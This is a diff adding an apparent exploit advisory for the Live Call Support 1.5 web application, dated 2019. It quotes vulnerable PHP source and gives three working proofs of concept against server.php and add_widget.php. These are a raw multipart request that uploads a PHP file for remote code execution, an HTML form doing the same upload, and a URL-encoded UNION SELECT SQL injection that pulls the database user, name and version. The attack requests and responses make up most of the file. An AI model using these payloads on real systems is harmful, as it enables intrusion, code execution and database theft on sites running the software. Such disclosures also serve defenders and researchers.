@@ -1,0 +1,134 @@
+# Exploit Title: Live Call Support 1.5 - Remote Code Execution / SQL Injection
+# Dork: N/A
+# Date: 2019-01-13
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://ranksol.com/
+# Software Link: https://codecanyon.net/item/live-call-support-widget-software-online-calling-web-application/22532799
+# Version: 1.5
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/server.php
+# 
+
+#/[PATH]/server.php
+#912 		case "save_settings":{
+#913 			if($_FILES['call_widget_image']['name']!=''){
+#914 				$ext = getExtension($_FILES['call_widget_image']['name']);
+#915 				$fileName = uniqid().'.'.$ext;
+#916 				$tmpName  = $_FILES['call_widget_image']['tmp_name'];
+#917 				$res = move_uploaded_file($tmpName,'images/'.$fileName);
+#918 				if($res){
+#919 					$fileName = $fileName;
+#920 					@unlink('images/'.$_REQUEST['hidden_call_widget_image']);
+#921 				}else{
+#922 					$fileName = $_REQUEST['hidden_call_widget_image'];
+#923 				}
+#924 			}else{
+#925 				$fileName = $_REQUEST['hidden_call_widget_image'];
+#926 			}
+
+POST /[PATH]/server.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/octet-stream
+Content-Length: 592
+Cookie: PHPSESSID=5fd1dbc1e4c6b5876e1f44dbc157af9f
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+-----------------------------307672102411665: undefined
+Content-Disposition: form-data; name="call_widget_image"; filename="phpinfo.php"
+<?php
+phpinfo();
+?>
+-----------------------------307672102411665
+Content-Disposition: form-data; name="hidden_call_widget_image"
+5c3b2a6842c13.png
+-----------------------------307672102411665
+Content-Disposition: form-data; name="settings_id"
+1
+-----------------------------307672102411665
+Content-Disposition: form-data; name="cmd"
+save_settings
+-----------------------------307672102411665--
+HTTP/1.1 302 Found
+Date: Sun, 13 Jan 2019 12:14:24 GMT
+Server: Apache
+X-Powered-By: PHP/7.1.25
+Access-Control-Allow-Origin: *
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+location: settings.php
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/server.php
+# 
+
+<html>
+<body>
+
+<form action="http://localhost/[PATH]/server.php" method="post" enctype="multipart/form-data">
+		<div class="form-group">
+			<label>Call Widget Image</label>
+			<input name="call_widget_image" type="file">
+			<input name="hidden_call_widget_image" value="5c3b2a6842c13.png" type="hidden">
+			</div>
+		<div class="form-group">
+			<input name="settings_id" value="1" type="hidden">
+			<input name="cmd" value="save_settings" type="hidden">
+			<input value="Save" class="btn btn-primary" type="submit">
+			<input value="Back" class="btn btn-default" onclick="history.go(-1)" type="button">
+		</div>
+</form>
+
+</body>
+</html>
+
+# POC: 
+# 3)
+# http://localhost/[PATH]/add_widget.php?wid=[SQL]
+# 
+
+#04 	if($_REQUEST['wid']!=''){
+#05 		$widget = getWidget($_REQUEST['wid']);
+#06 		$pageTitle = 'Edit Widget';
+#07 	}else{
+#08 		$pageTitle = 'Create Widget';
+#09 	}
+
+GET /[PATH]/add_widget.php?wid=%2d%34%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%201,%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29,%56%45%52%53%49%4f%4e()%29%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2d%2d%20%2d HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=5fd1dbc1e4c6b5876e1f44dbc157af9f
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Date: Sun, 13 Jan 2019 12:34:12 GMT
+Server: Apache
+X-Powered-By: PHP/7.1.25
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
